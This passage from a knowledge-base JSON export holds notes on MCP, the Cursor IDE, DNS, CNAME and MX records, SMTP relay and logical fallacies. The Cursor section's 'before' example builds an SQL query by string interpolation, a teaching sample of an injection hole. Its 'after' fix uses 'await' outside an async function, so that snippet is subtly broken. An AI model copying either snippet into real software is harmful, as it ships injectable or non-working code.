external tools (e.g., calendars, email, databases) can use MCP to pass structured context between the model and the tool, enabling richer, context-aware actions.\n\n- **Open-Source MCP Reference Implementations:**  \n  - [Anthropic’s MCP Reference Server](https://github.com/anthropics/model-context-protocol) (see the GitHub repo for code and examples)\n  - Community projects and SDKs are expected to emerge as MCP adoption grows.\n\n- **Custom Internal AI Gateways:**  \n  Organizations building internal AI platforms can implement MCP servers to standardize context handling between proprietary models, tools, and user interfaces.\n\n**Note:** As MCP adoption increases, more open-source and commercial MCP server implementations are likely to appear. For the latest, check the [official MCP GitHub repository](https://github.com/anthropics/model-context-protocol) and related community\n\n## Brief History of MCP\n\nThe Model Context Protocol (MCP) was introduced by Anthropic in 2024 as part of an effort to standardize how AI models, tools, and applications exchange contextual information. As AI systems became more complex and interconnected, the need for a common protocol to maintain context and state across different components became clear. MCP was developed as an open standard to address these challenges, enabling interoperability and continuity in multi-agent and multi-tool AI environments. Its release marked a significant step toward more collaborative and context-aware AI ecosystems.\n\nFor more details, see the [official announcement](https://www.anthropic.com/news/model-context-protocol)\n\n## References\n\n- [Anthropic: Model Context Protocol Announcement](https://www.anthropic.com/news/model-context-protocol)"
    },
    {
      "id": "ai/applications/cursor/cursor-skills",
      "title": "Cursor IDE Skills: Complete Overview",
      "path": [
        "ai",
        "applications",
        "cursor",
        "cursor-skills"
      ],
      "content": "# Cursor IDE Skills: Complete Overview\n\nCursor is an AI-powered code editor (forked from VS Code) that augments your development workflow with inline AI assistance, codebase-aware chat, and agentic code generation. Think of it as pair programming with an AI that actually knows your codebase — not just generic knowledge. Mastering Cursor's features is less about memorizing shortcuts and more about **learning how to communicate intent effectively** to an AI collaborator.\n\n## Key Points\n\n- **VS Code Foundation:** Cursor inherits all VS Code extensions, keybindings, and settings. If you know VS Code, the basics are familiar.\n- **AI-Native:** AI is embedded into every workflow — editing, searching, debugging, and refactoring.\n- **Codebase-Aware:** Cursor indexes your project and uses it as context, so suggestions are grounded in *your* code, not just general patterns.\n- **Three Core Interactions:** Tab (autocomplete), Cmd+K (inline edit), and Chat (conversational).\n- **Context Is King:** The quality of Cursor's output is directly proportional to how well you provide context.\n\n## Core Features & How to Use Them\n\n### 1. Tab Autocomplete\n\nCursor's autocomplete goes beyond single-line suggestions — it predicts multi-line completions based on surrounding context.\n\n```\n# What you type:\ndef calculate_total(items):\n    |  ← cursor here\n\n# What Cursor suggests (multi-line):\n    subtotal = sum(item.price * item.quantity for item in items)\n    tax = subtotal * 0.0875\n    return subtotal + tax\n```\n\n**Tips:**\n- Just start typing and let Tab do the work. It learns from patterns in your codebase.\n- Press `Tab` to accept, `Esc` to dismiss.\n- It's context-aware — if you have a `Tax` constant defined elsewhere, it'll use that instead of hardcoding.\n\n### 2. Cmd+K (Inline Editing)\n\nSelect code (or place your cursor) and press `Cmd+K` to give natural language instructions for editing. This is your **surgical tool** — precise, targeted changes without leaving your flow.\n\n```js\n// Before: Select this function and Cmd+K → \"add input validation and error handling\"\nfunction getUser(id) {\n  const user = db.query(`SELECT * FROM users WHERE id = ${id}`);\n  return user;\n}\n\n// After Cursor applies the edit:\nfunction getUser(id) {\n  if (!id || typeof id !== \"string\") {\n    throw new Error(\"Invalid user ID\");\n  }\n  const user = await db.query(\"SELECT * FROM users WHERE id = $1\", [id]);\n  if (!user) {\n    throw new NotFoundError(`User ${id} not found`);\n  }\n  return user;\n}\n```\n\n**Common Cmd+K prompts:**\n- `\"add TypeScript types\"`\n- `\"refactor to use async/await\"`\n- `\"add error handling\"`\n- `\"optimize this query\"`\n- `\"add JSDoc comments\"`\n\n### 3. Chat (Cmd+Shift+L / Cmd+Shift+I)\n\nConversational AI for broader tasks — explaining code, planning architecture, debugging, or generating new files. Chat has full awareness of your codebase when you reference files with `@`.\n\n```\nYou:  @userService.js Why is this function returning null\n      for users with special characters in their name?\n\nCursor: Looking at your `getUser` function in userService.js,\n        the issue is on line 42 — you're using string interpolation\n        in your SQL query instead of parameterized queries. Special\n        characters like O'Brien break the SQL syntax...\n```\n\n### 4. The `@` Symbol — Context References\n\nThe `@` symbol is how you point Cursor to specific context. This is arguably the **most important skill** to master.\n\n| Reference | What It Does | Example |\n|---|---|---|\n| `@filename` | Includes a specific file | `@userService.js explain the auth flow` |\n| `@folder` | Includes a directory | `@src/services what patterns are used here?` |\n| `@codebase` | Searches the full indexed codebase | `@codebase where is the Stripe webhook handled?` |\n| `@web` | Searches the web for external info | `@web latest AWS SDK v3 syntax for DynamoDB` |\n| `@docs` | Searches documentation you've added | `@docs how do we handle auth in our API?` |\n| `@git` | References git history | `@git what changed in the last commit?` |\n\n### 5. Agent Mode\n\nAgent mode lets Cursor autonomously execute multi-step tasks — creating files, running terminal commands, installing dependencies, and iterating on errors. Think of it as handing off a work order rather than pair programming.\n\n```\nYou:  Create a new Express endpoint at /api/reports that queries\n      our DynamoDB reports table, filters by date range from\n      query params, and returns paginated results. Follow the\n      patterns in @src/handlers/getUser.js\n\nAgent: I'll create this endpoint step by step:\n       1. Creating src/handlers/getReports.js...\n       2. Adding route to src/routes/index.js...\n       3. Creating src/services/reportService.js...\n       4. Adding tests in tests/handlers/getReports.test.js...\n       5. Running tests... ✓ All passing\n```\n\n**When to use Agent vs Cmd+K:**\n- **Cmd+K:** Editing existing code, targeted changes, single-file work.\n- **Agent:** Multi-file tasks, scaffolding, refactors that touch many files, tasks requiring terminal commands.\n\n### 6. `.cursorrules` File\n\nA project-level configuration file that tells Cursor how your team works. Place it in your project root. This is like giving your AI pair programmer a team onboarding doc.\n\n```markdown\n# .cursorrules\n\n## Project Context\nThis is a Node.js serverless API using AWS SAM, TypeScript, and DynamoDB.\n\n## Code Style\n- Use async/await, never raw Promises or callbacks\n- All handlers follow the thin-handler pattern (delegate to services)\n- Use Zod for runtime validation on all inputs\n- Error responses must use our standard format: { error: string, code: string }\n\n## File Structure\n- Handlers go in src/handlers/\n- Business logic goes in src/services/\n- Shared types in src/types/\n- Tests mirror the src/ structure under tests/\n\n## Testing\n- Use vitest for all tests\n- Every handler needs unit tests and at least one integration test\n- Mock AWS services using aws-sdk-client-mock\n\n## Don't\n- Don't use AWS SDK v2 — we use v3 exclusively\n- Don't hardcode table names — use environment variables\n- Don't put business logic in handlers\n```\n\n## Effective Prompting Patterns\n\nThe quality gap between a vague prompt and a precise one is enormous in Cursor — the same tool, wildly different results.\n\n### Bad vs Good Prompts\n\n```\n❌ \"Fix this\"\n✅ \"This function throws a TypeError when `items` is an empty array.\n    Add a guard clause and return an empty result instead.\"\n\n❌ \"Make this better\"\n✅ \"Refactor this to use early returns instead of nested if/else,\n    and extract the validation logic into a separate function.\"\n\n❌ \"Write tests\"\n✅ \"Write vitest unit tests for calculateTotal covering:\n    empty cart, single item, multiple items, and negative quantities.\n    Follow the pattern in @tests/services/orderService.test.ts\"\n```\n\n### The Context Sandwich\n\nFor complex tasks, structure your prompt in three layers:\n\n```\n1. WHAT: What you want done\n2. WHERE: Reference files/patterns with @\n3. HOW: Constraints, patterns, or style to follow\n\nExample:\n\"Create a new Lambda handler for DELETE /users/{id}     ← WHAT\n following the same pattern as @src/handlers/getUser.ts  ← WHERE\n with Zod validation, proper error handling, and a        ← HOW\n corresponding unit test file.\"\n```\n\n## Common Pitfalls\n\n- **Under-specifying context.** Cursor can't read your mind — if the output is wrong, you probably didn't give it enough context. Use `@` references liberally.\n- **Accepting code without reading it.** AI-generated code can look correct but have subtle bugs. Review diffs carefully, especially around edge cases, null handling, and security.\n- **Not using `.cursorrules`.** Without it, Cursor defaults to generic patterns that may not match your team's conventions. Ten minutes writing this file saves hours of correcting output.\n- **Treating Cmd+K like Chat.** Cmd+K is for targeted edits on selected code. For broader questions or multi-file tasks, use Chat or Agent mode.\n- **Ignoring codebase indexing.** If `@codebase` returns poor results, your project may not be fully indexed. Check Cursor Settings → Features → Codebase Indexing.\n\n## Keyboard Shortcuts (macOS / Windows)\n\n| Action | macOS | Windows |\n|---|---|---|\n| Inline edit | `Cmd+K` | `Ctrl+K` |\n| Open Chat panel | `Cmd+Shift+L` | `Ctrl+Shift+L` |\n| Inline Chat | `Cmd+Shift+I` | `Ctrl+Shift+I` |\n| Accept autocomplete | `Tab` | `Tab` |\n| Reject autocomplete | `Esc` | `Esc` |\n| Toggle Agent mode | In Chat panel | In Chat panel |\n| Add file to context | `@filename` in chat | `@filename` in chat |\n\n## Practical Applications\n\n- **Onboarding to a new codebase.** Use `@codebase` + Chat to ask \"how does auth work in this project?\" or \"where are database queries made?\" instead of grep-and-pray.\n- **Refactoring at scale.** Agent mode can update dozens of files to match a new pattern — rename an interface, migrate from one library to another, add error handling everywhere.\n- **Writing tests faster.** Point Cursor at a function with `@` and ask for tests covering specific scenarios. It'll match your existing test patterns if you reference them.\n- **Debugging.** Paste an error message into Chat with `@` references to the relevant files — Cursor often identifies the root cause faster than manually tracing.\n- **Code review prep.** Ask Chat to review your changes for bugs, security issues, or style violations before opening a PR.\n\n## References\n\n- [Cursor Documentation](https://docs.cursor.com)\n- [Cursor Changelog](https://cursor.com/changelog)\n- [.cursorrules Examples (Community)](https://github.com/PatrickJS/awesome-cursorrules)\n- [Prompt Engineering for Code (Anthropic)](https://docs.claude.com/en/docs/build-with-claude/prompt-engineering/overview)\n\n---\n\n## Greater Detail\n\n### Advanced Concepts\n\n- **Custom Docs (`@docs`):** You can index external documentation (API docs, internal wikis, library references) so Cursor can reference them. Add URLs in Cursor Settings → Features → Docs. Especially useful for niche or internal libraries that the AI wouldn't otherwise know about.\n- **Multi-File Diffs:** When Agent mode touches multiple files, review the diff holistically. A change in a type definition might ripple through services and handlers — make sure all the pieces are consistent.\n- **Model Selection:** Cursor supports multiple underlying models (Claude, GPT-4, etc.). Experiment to find which works best for your use case — some models are better at certain languages or frameworks.\n- **Composer Workflows:** For very large tasks (new feature across 10+ files), break the work into phases and give Cursor one phase at a time. This mimics how you'd delegate to a junior developer — clear scope, one deliverable at a time.\n- **Privacy & Codebase Indexing:** Cursor's codebase indexing sends code to their servers for embedding. If working with sensitive code, review Cursor's privacy settings and consider using Privacy Mode, which disables cloud-based indexing."
    },
    {
      "id": "ai/misc/mime-type-issues",
      "title": "Mime Type Issues",
      "path": [
        "ai",
        "misc",
        "mime-type-issues"
      ],
      "content": ""
    },
    {
      "id": "misc/cname",
      "title": "CNAME Records: A Concise Overview",
      "path": [
        "misc",
        "cname"
      ],
      "content": "# CNAME Records: A Concise Overview\n\nA CNAME (Canonical Name) record is a type of DNS record that maps an alias domain name to another canonical (true) domain name. This allows multiple domain names to point to the same resource, simplifying DNS management and enabling flexible domain configurations.\n\n## Key Points\n\n- **Alias Mapping:** CNAME records create an alias for another domain name.\n- **Chaining:** DNS lookups follow the CNAME chain until an A/AAAA record is found.\n- **No Other Records:** A domain with a CNAME record cannot have other records (like A, MX) at the same node.\n- **Simplifies Management:** Changing the target domain updates all aliases automatically.\n- **Common Use:** Used for subdomains, CDN integration, and branded URLs.\n\n## Step-by-Step Explanation & Examples\n\n1. **Basic CNAME Record Example**\n   ```txt\n   www.example.com.   IN   CNAME   example.com.\n   blog.example.com.  IN   CNAME   sites.hosting.com.\n   ```\n\n2. **DNS Lookup Flow**\n   - User requests `www.example.com`.\n   - DNS finds CNAME pointing to `example.com`.\n   - DNS continues lookup for `example.com` (usually finds an A record).\n\n3. **Configuring a CNAME (Cloudflare Example)**\n   - In your DNS provider, add a CNAME record for `app.yourdomain.com` pointing to `yourapp.hosting.com`.\n\n## Common Pitfalls\n\n- Placing a CNAME at the root domain (e.g., `example.com`) is not allowed by DNS standards.\n- Mixing CNAME with other records at the same node causes DNS errors.\n- Chained CNAMEs can slow down resolution and increase lookup time.\n\n## Practical Applications\n\n- Pointing subdomains to external services (e.g., `blog.yourdomain.com` to Medium).\n- Managing branded URLs for marketing or tracking.\n- Integrating with CDNs and cloud platforms.\n\n## References\n\n- [Cloudflare: What is a CNAME record?](https://www.cloudflare.com/learning/dns/dns-records/dns-cname-record/)\n- [RFC 1034: CNAME Records](https://datatracker.ietf.org/doc/html/rfc1034)\n- [Namecheap: CNAME Record Guide](https://www.namecheap.com/support/knowledgebase/article.aspx/9776/2237/cname-record/)\n\n---\n\n## Greater Detail\n\n### Advanced Concepts\n\n- **CNAME Flattening:** Some DNS providers offer CNAME flattening to allow CNAME-like behavior at the root domain.\n- **Chained CNAMEs:** Multiple CNAMEs can be chained, but this is discouraged due to performance concerns.\n- **Alternatives:** Use A or ALIAS records for root domains or when CNAME is not permitted."
    },
    {
      "id": "misc/dns",
      "title": "How DNS Works: A Concise Overview",
      "path": [
        "misc",
        "dns"
      ],
      "content": "# How DNS Works: A Concise Overview\n\nThe Domain Name System (DNS) is a distributed database that translates human-readable domain names (like example.com) into IP addresses that computers use to communicate. DNS is fundamental to the functioning of the internet.\n\n## Key Points\n\n- **Resolution:** DNS converts domain names to IP addresses.\n- **Hierarchy:** DNS uses a hierarchical structure (root, TLD, authoritative servers).\n- **Caching:** DNS responses are cached to improve speed and reduce load.\n- **Records:** Common DNS record types include A, AAAA, MX, CNAME, and TXT.\n- **Redundancy:** Multiple DNS servers ensure reliability and fault tolerance.\n\n## Common DNS Record Types Explained\n\n- **A:** Maps a domain to an IPv4 address.\n- **AAAA:** Maps a domain to an IPv6 address.\n- **MX:** Specifies mail servers for email delivery.\n- **CNAME:** Creates an alias from one domain to another.\n- **TXT:** Stores arbitrary text, often used for verification and security (e.g., SPF, DKIM).\n- **PTR:** Used for reverse DNS lookups (IP to domain).\n- **NS:** Specifies authoritative name servers for the domain.\n- **SOA:** Start of Authority, contains domain administration information.\n\n## Step-by-Step Explanation & Examples\n\n1. **DNS Query Flow**\n   - User enters `www.example.com` in a browser.\n   - Browser checks local DNS cache.\n   - If not found, query goes to the OS resolver, then to a recursive DNS server.\n   - Recursive server queries root, TLD, and authoritative servers as needed.\n   - IP address is returned and used to connect to the website.\n\n2. **Common DNS Record Example**\n   ```txt\n   example.com.   IN   A   93.184.216.34\n   www.example.com.   IN   CNAME   example.com.\n   example.com.   IN   MX   10   mail.example.com.\n   ```\n\n3. **DNS Lookup in Code (Node.js Example)**\n   ```js\n   const dns = require('dns');\n   dns.lookup('example.com', (err, address) => {\n     console.log(address); // 93.184.216.34\n   });\n   ```\n\n## Common Pitfalls\n\n- Incorrect DNS records can cause websites or services to be unreachable.\n- DNS propagation delays after changes.\n- Not securing DNS (e.g., DNS spoofing, cache poisoning).\n- Overlooking TTL (Time To Live) settings, affecting cache duration.\n\n## Practical Applications\n\n- Hosting websites and web services.\n- Email delivery (MX records).\n- Load balancing and failover (multiple A or CNAME records).\n- Service discovery in distributed systems.\n\n## References\n\n- [MDN: Introduction to DNS](https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/DNS)\n- [Cloudflare: What is DNS?](https://www.cloudflare.com/learning/dns/what-is-dns/)\n- [Wikipedia: Domain Name System](https://en.wikipedia.org/wiki/Domain_Name_System)\n\n---\n\n## Greater Detail\n\n### Advanced Concepts\n\n- **DNSSEC:** Security extensions to protect against spoofing and tampering.\n- **Reverse DNS:** Mapping IP addresses back to domain names (PTR records).\n- **Anycast DNS:** Using multiple geographically distributed servers for faster, more reliable resolution.\n- **Dynamic DNS:** Automatically updating DNS records"
    },
    {
      "id": "misc/email-smtp",
      "title": "MX Records and SMTP Relay Rules: A Concise Overview",
      "path": [
        "misc",
        "email-smtp"
      ],
      "content": "# MX Records and SMTP Relay Rules: A Concise Overview\n\nMX (Mail Exchange) records and SMTP (Simple Mail Transfer Protocol) relay rules are essential for routing and delivering email across the internet. Understanding these concepts is key for configuring reliable email systems.\n\n## Key Points\n\n- **MX Records:** DNS records that specify which mail servers are responsible for receiving email for a domain.\n- **SMTP Relay:** The process of transferring email from one server to another, often through intermediate relays.\n- **Priority:** MX records can have different priorities, allowing for backup mail servers.\n- **Authentication:** SMTP relays often require authentication to prevent abuse and spam.\n- **Security:** Proper configuration helps prevent unauthorized relaying and email spoofing.\n\n## Step-by-Step Explanation & Examples\n\n1. **Setting Up MX Records**\n   ```txt\n   example.com.   IN   MX   10   mail1.example.com.\n   example.com.   IN   MX   20   mail2.example.com.\n   ```\n   - `10` and `20` are priorities; lower numbers are prioritized/preferred.\n\n2. **SMTP Relay Flow**\n   - User sends email via their mail client.\n   - The client connects to an SMTP server.\n   - The SMTP server looks up the recipient’s MX record.\n   - The email is relayed to the destination mail server.\n\n3. **Configuring SMTP Relay (Postfix Example)**\n   ```conf\n   relayhost = [smtp-relay.example.com]:587\n   smtp_sasl_auth_enable = yes\n   smtp_sasl_password_maps = hash:/etc/postfix/sasl_passwd\n   ```\n\n## Common Pitfalls\n\n- Incorrect MX record priorities or targets can cause email delivery failures.\n- Open SMTP relays can be abused for spam; always require authentication.\n- Not updating MX records after server changes leads to lost or delayed email.\n- Failing to secure SMTP connections (TLS) exposes email to interception.\n\n## Practical Applications\n\n- Setting up custom email domains.\n- Ensuring high availability with multiple MX records.\n- Integrating third-party email services (e.g., SendGrid, Mailgun).\n\n## References\n\n- [MX Record Basics (Cloudflare)](https://developers.cloudflare.com/dns/manage-dns-records/how-mx-records-work/)\n- [SMTP Relay Explained (Mailgun)](https://www.mailgun.com/blog/what-is-smtp-relay/)\n- [Postfix SMTP Relay Configuration](http://www.postfix.org/STANDARD_CONFIGURATION_README.html)\n\n---\n\n## Greater Detail\n\n### Advanced Concepts\n\n- **Failover and Load Balancing:** Use multiple MX records with different priorities for redundancy and load distribution.\n- **SPF, DKIM, and DMARC:** Implement these DNS records and protocols to improve email deliverability and security.\n- **SMTP Relay Restrictions:** Limit relaying to trusted IPs or authenticated users to prevent abuse.\n- **Monitoring and Logging:** Track relay activity and delivery status for troubleshooting and"
    },
    {
      "id": "misc/logical-fallacies",
      "title": "Logical Fallacies: Complete Overview",
      "path": [
        "misc",
        "logical-fallacies"
      ],
      "content": "# Logical Fallacies: Complete Overview\n\nLogical fallacies are flawed reasoning patterns that make arguments invalid or misleading, even if they sound persuasive. They involve errors in logic where the conclusion doesn't follow from the premises, or irrelevant information is used to support a claim. Think of fallacies like optical illusions for reasoning—they look convincing at first glance, but closer examination reveals the argument doesn't actually hold up.\n\n## Key Points\n\n- **Fallacy:** Error in reasoning that undermines argument validity\n- **Types:** Formal (structural errors) vs Informal (content errors)\n- **Common:** Ad hominem, straw man, false dilemma, slippery slope\n- **Why Care:** Spot weak arguments, improve critical thinking\n- **Not Always Wrong:** Conclusion might be true despite fallacious reasoning\n\n## Summary\n\n**Logical Fallacy:** Flawed reasoning that undermines argument validity.\n\n**Common Fallacies:**\n- **Ad Hominem:** Attack person, not argument\n- **Straw Man:** Misrepresent argument, attack distortion\n- **False Dilemma:** Present only two options\n- **Slippery Slope:** Claim one step leads to extreme\n- **Appeal to Authority:** Expert says X, therefore true\n- **Hasty Generalization:** Small sample → broad conclusion\n- **Circular Reasoning:** Conclusion restates premise\n- **Post Hoc:** A before B, so A caused B\n\n**Spotting:**\n- Does conclusion follow from premises?\n- Is argument addressing the actual point?\n- What evidence supports this?\n- Are emotions replacing logic?\n\n**Rule of thumb:** Attack arguments, not people. Consider all options, not just two. Correlation ≠ causation. Popularity ≠ correctness. Evidence beats emotion. Question assumptions. Think critically.\n\n---\n\n## Ad Hominem (Attack the Person)\n\n```\nPattern: Attack the person instead of their argument\n\nExample 1:\n\"You can't trust John's climate change research. \nHe drives an SUV!\"\n❌ His vehicle choice doesn't invalidate his research\n\nExample 2:\n\"Why should we listen to your economic policy? \nYou're not even rich!\"\n❌ Personal wealth doesn't determine argument validity\n\nCorrect Response:\nAddress the research/policy on its merits\n```\n\n## Straw Man\n\n```\nPattern: Misrepresent opponent's argument, then attack the distortion\n\nExample 1:\nPerson A: \"We should have more bike lanes for safety.\"\nPerson B: \"So you want to ban all cars? That's ridiculous!\"\n❌ Person A never said ban cars\n\nExample 2:\nPerson A: \"Police need better training.\"\nPerson B: \"You want to abolish all law enforcement!\"\n❌ Training ≠ abolishment\n\nCorrect Response:\n\"No, I said [original argument]. Address that instead.\"\n```\n\n## False Dilemma (False Binary)\n\n```\nPattern: Present only two options when more exist\n\nExample 1:\n\"You're either with us or against us.\"\n❌ Ignores neutral positions, partial agreement\n\nExample 2:\n\"Either we cut all social programs or the economy collapses.\"\n❌ Many options between these extremes\n\nExample 3:\n\"Love it or leave it!\"\n❌ Can love country and want improvements\n\nReality: Most issues have spectrum of positions\n```\n\n## Slippery Slope\n\n```\nPattern: Claim one step inevitably leads to extreme outcome\n\nExample 1:\n\"If we allow gay marriage, next people will marry animals!\"\n❌ No logical connection, each evaluated separately\n\nExample 2:\n\"If we raise minimum wage by $1, businesses will all close!\"\n❌ Assumes inevitable chain without evidence\n\nExample 3:\n\"Let students retake one test, soon they'll retake everything!\"\n❌ Assumes no boundaries possible\n\nValid Slippery Slope: Must show actual causal chain\n```\n\n## Appeal to Authority\n\n```\nPattern: \"Expert says X, therefore X is true\"\n\nExample 1:\n\"Einstein believed in God, so God exists.\"\n❌ Expertise in physics ≠ expertise in theology\n\nExample 2:\n\"This celebrity uses Brand X vitamins, so they work!\"\n❌ Celebrity endorsement ≠ scientific evidence\n\nExample 3:\n\"My doctor friend said climate change is fake.\"\n❌ Doctor ≠ climate scientist\n\nValid Authority: Relevant expert in their field\n```\n\n## Appeal to Emotion\n\n```\nPattern: Use emotions instead of logic\n\nAppeal to Fear:\n\"Don't vaccinate your kids—think of all that could go wrong!\"\n❌ Fear without evidence\n\nAppeal to Pity:\n\"Give me an A—my grandmother just died.\"\n❌ Sad situation doesn't change work quality\n\nAppeal to Flattery:\n\"Smart people like you know this product is best.\"\n❌ Flattery isn't evidence\n\nValid Emotion: Can complement logic, not replace it\n```\n\n## Hasty Generalization\n\n```\nPattern: Draw broad conclusion from small sample\n\nExample 1:\n\"I met two rude New Yorkers. All New Yorkers are rude!\"\n❌ Two people ≠ entire city\n\nExample 2:\n\"My friend got sick after vaccination. Vaccines are dangerous!\"\n❌ Single case ≠ general safety profile\n\nExample 3:\n\"This JavaScript framework failed once. All JS is bad!\"\n❌ One tool/instance ≠ entire language\n\nNeed: Adequate sample size, representative data\n```\n\n## Circular Reasoning (Begging the Question)\n\n```\nPattern: Conclusion restates premise\n\nExample 1:\n\"The Bible is true because it says so in the Bible.\"\n❌ Uses conclusion as premise\n\nExample 2:\n\"This law is good because it's the right thing to do.\"\n❌ \"Good\" and \"right\" are same claim\n\nExample 3:\n\"I'm trustworthy because I never lie.\"\n❌ Being trustworthy means not lying—circular\n\nNeed: Independent evidence\n```\n\n## Red Herring\n\n```\nPattern: Distract with irrelevant information\n\nExample 1:\nPerson A: \"You're late to work again.\"\nPerson B: \"What about Tom? He takes long lunches!\"\n❌ Tom's lunches don't excuse lateness\n\nExample 2:\n\"Why focus on local crime when there's a war overseas?\"\n❌ One issue doesn't negate the other\n\nExample 3:\n\"You say I spend too much, but remember when you...\"\n❌ Deflection to avoid main point\n\nStay Focused: Address original argument\n```\n\n## Appeal to Tradition\n\n```\nPattern: \"We've always done it this way\"\n\nExample 1:\n\"Marriage has always been between man and woman.\"\n❌ Tradition doesn't equal correctness\n\nExample 2:\n\"We've always used this technology stack.\"\n❌ Better tools may exist\n\nExample 3:\n\"Manual testing worked for 20 years, why automate?\"\n❌ Long use doesn't mean optimal\n\nValid: Tradition can inform, but needs justification\n```\n\n## Appeal to Novelty\n\n```\nPattern: \"New is always better\"\n\nExample 1:\n\"This new framework just came out—we should use it!\"\n❌ New ≠ better or stable\n\nExample 2:\n\"Traditional methods are outdated. Use this new diet!\"\n❌ Old methods might work better\n\nExample 3:\n\"Our competitor uses AI, so we must too!\"\n❌ Novelty without purpose\n\nValid: Evaluate new vs old on merits\n```\n\n## Post Hoc (False Cause)\n\n```\nPattern: \"A happened before B, so A caused B\"\n\nFull name: Post hoc ergo propter hoc\n(\"After this, therefore because of this\")\n\nExample 1:\n\"I wore my lucky socks and we won the game!\"\n❌ Correlation ≠ causation\n\nExample 2:\n\"Crime dropped after new mayor elected.\"\n❌ Many factors affect crime rates\n\nExample 3:\n\"I got sick after the new restaurant opened.\"\n❌ Timing doesn't prove causation\n\nNeed: Demonstrate actual causal mechanism\n```\n\n## Tu Quoque (You Too)\n\n```\nPattern: \"You do it too, so your criticism is invalid\"\n\nExample 1:\n\"You tell me to quit smoking, but you smoke!\"\n❌ Hypocrisy doesn't invalidate argument\n\nExample 2:\n\"America criticizes human rights? They have problems too!\"\n❌ Others' faults don't excuse yours\n\nExample 3:\n\"You say my code is messy, but yours has bugs!\"\n❌ Deflection doesn't address messiness\n\nReality: Argument stands independently of speaker\n```\n\n## Bandwagon (Appeal to Popularity)\n\n```\nPattern: \"Everyone does/believes it, so it's right\"\n\nExample 1:\n\"50 million users can't be wrong!\"\n❌ Popularity ≠ quality\n\nExample 2:\n\"All the cool developers use React.\"\n❌ Popularity doesn't mean best for your needs\n\nExample 3:\n\"Everyone cheats on taxes a little.\"\n❌ Common practice ≠ ethical\n\nValid: Popularity can indicate value, but isn't proof\n```\n\n## No True Scotsman\n\n```\nPattern: Defend generalization by excluding counterexamples\n\nExample 1:\nPerson A: \"No Scotsman puts sugar on porridge.\"\nPerson B: \"My uncle is Scottish and does.\"\nPerson A: \"Well, no TRUE Scotsman does.\"\n❌ Moving goalposts\n\nExample 2:\n\"Real programmers use Vim.\"\n\"I'm a programmer and use VS Code.\"\n\"Real programmers use Vim!\"\n❌ Arbitrary redefinition\n\nExample 3:\n\"Christians don't sin.\"\n\"But this Christian committed murder.\"\n\"He's not a true Christian then.\"\n❌ Protects claim by redefining terms\n```\n\n## False Equivalence\n\n```\nPattern: Treat very different things as equivalent\n\nExample 1:\n\"Speeding and murder are both crimes, equally bad.\"\n❌ Severity matters\n\nExample 2:\n\"Scientists disagree on details, just like flat-earthers.\"\n❌ Scientific debate ≠ denying established facts\n\nExample 3:\n\"Bug in my code vs. security breach are both mistakes.\"\n❌ Impact and scale differ greatly\n\nReality: Differences in degree matter\n```\n\n## Loaded Question\n\n```\nPattern: Question assumes unproven premise\n\nExample 1:\n\"Have you stopped beating your wife?\"\n❌ Assumes you were beating her\n\nExample 2:\n\"Why is your code so bad?\"\n❌ Assumes code is bad\n\nExample 3:\n\"When did you become so lazy?\"\n❌ Assumes current laziness\n\nCorrect: Challenge the premise first\n```\n\n## Middle Ground Fallacy\n\n```\nPattern: \"Truth must be in the middle\"\n\nExample 1:\nPerson A: \"2 + 2 = 4\"\nPerson B: \"2 + 2 = 6\"\nCompromise: \"2 + 2 = 5\"\n❌ Middle ground isn't always correct\n\nExample 2:\n\"Some say climate change is real, others say fake.\nTruth must be somewhere in between.\"\n❌ One side might be completely right\n\nExample 3:\n\"Let's compromise: 50% test coverage.\"\n❌ Maybe 80% is objectively better\n\nReality: Sometimes one position is correct\n```\n\n## Genetic Fallacy\n\n```\nPattern: Judge argument by its origin\n\nExample 1:\n\"That idea came from Reddit, so it's worthless.\"\n❌ Source doesn't determine validity\n\nExample 2:\n\"Hitler supported animal rights, so animal rights are bad.\"\n❌ Bad person can have good ideas\n\nExample 3:\n\"That's a junior dev's suggestion, ignore it.\"\n❌ Good ideas come from anywhere\n\nValid: Evaluate idea on merits, not origin\n```\n\n## Anecdotal Evidence\n\n```\nPattern: Use personal experience as proof\n\nExample 1:\n\"My grandfather smoked and lived to 90, so smoking is safe!\"\n❌ Single case doesn't override statistics\n\nExample 2:\n\"I never wear a seatbelt and never got hurt.\"\n❌ Personal luck ≠ general safety\n\nExample 3:\n\"This framework worked for my project, so it's the best!\"\n❌ One success doesn't mean universal solution\n\nValid: Anecdotes illustrate, but don't prove\n```\n\n## Texas Sharpshooter\n\n```\nPattern: Cherry-pick data to fit conclusion\n\nExample 1:\nShoot wall randomly, then draw target around hits.\nClaim: \"Perfect shot every time!\"\n❌ Pattern created after the fact\n\nExample 2:\n\"Look at all the predictions I got right!\"\n(Ignores all the wrong ones)\n❌ Selection bias\n\nExample 3:\n\"These 3 studies prove my point.\"\n(Ignores 20 studies that contradict)\n❌ Cherry-picking data\n\nNeed: Consider all relevant data\n```\n\n## Avoiding Fallacies\n\n```javascript\n// ✅ Steel man opponent's argument\n// Strengthen their position before responding\nconst opponentArgument = strongest_version(argument);\nrespond(opponentArgument);\n\n// ✅ Check your own reasoning\nif (attacking_person_not_argument) {\n  fallacy = 'ad_hominem';\n}\n\n// ✅ Ask for evidence\nclaim = \"Everyone uses this framework\";\nresponse = \"Can you provide usage statistics?\";\n\n// ✅ Identify the logical structure\npremise1 = \"A is true\";\npremise2 = \"B is true\";\nconclusion = \"Therefore C\";\n// Does C follow from A and B?\n\n// ✅ Consider alternative explanations\nobserved = \"Sales increased after new website\";\npossible_causes = [\n  \"New website drove sales\",\n  \"Seasonal trend\",\n  \"Marketing campaign\",\n  \"Competitor closed\"\n];\n\n// ❌ Don't use fallacies to win\nwinning_argument = build_sound_argument(evidence);\n// not: attack_person(), distract(), appeal_to_emotion()\n\n// ❌ Don't dismiss argument due to fallacy\n// Address the core claim even if reasoning is flawed\n```\n\n## Spotting Fallacies\n\n```\nQuestions to ask:\n\n1. \"Does the conclusion follow logically?\"\n   If no → formal fallacy\n\n2. \"Is this addressing the argument or something else?\"\n   If something else → red herring, ad hominem\n\n3. \"Are there unstated assumptions?\"\n   May reveal hidden fallacy\n\n4. \"What evidence supports this?\"\n   Lack of evidence → appeal to authority, emotion\n\n5. \"Am I being emotionally manipulated?\"\n   Fear, pity, flattery → appeal to emotion\n\n6. \"Are all options being considered?\"\n   If no → false dilemma\n\n7. \"Is this a fair representation?\"\n   If no → straw man\n```\n\n## References\n\n- [Logical Fallacies (YourLogicalFallacyIs.com)](https://yourlogicalfallacyis.com/)\n- [Wikipedia: List of 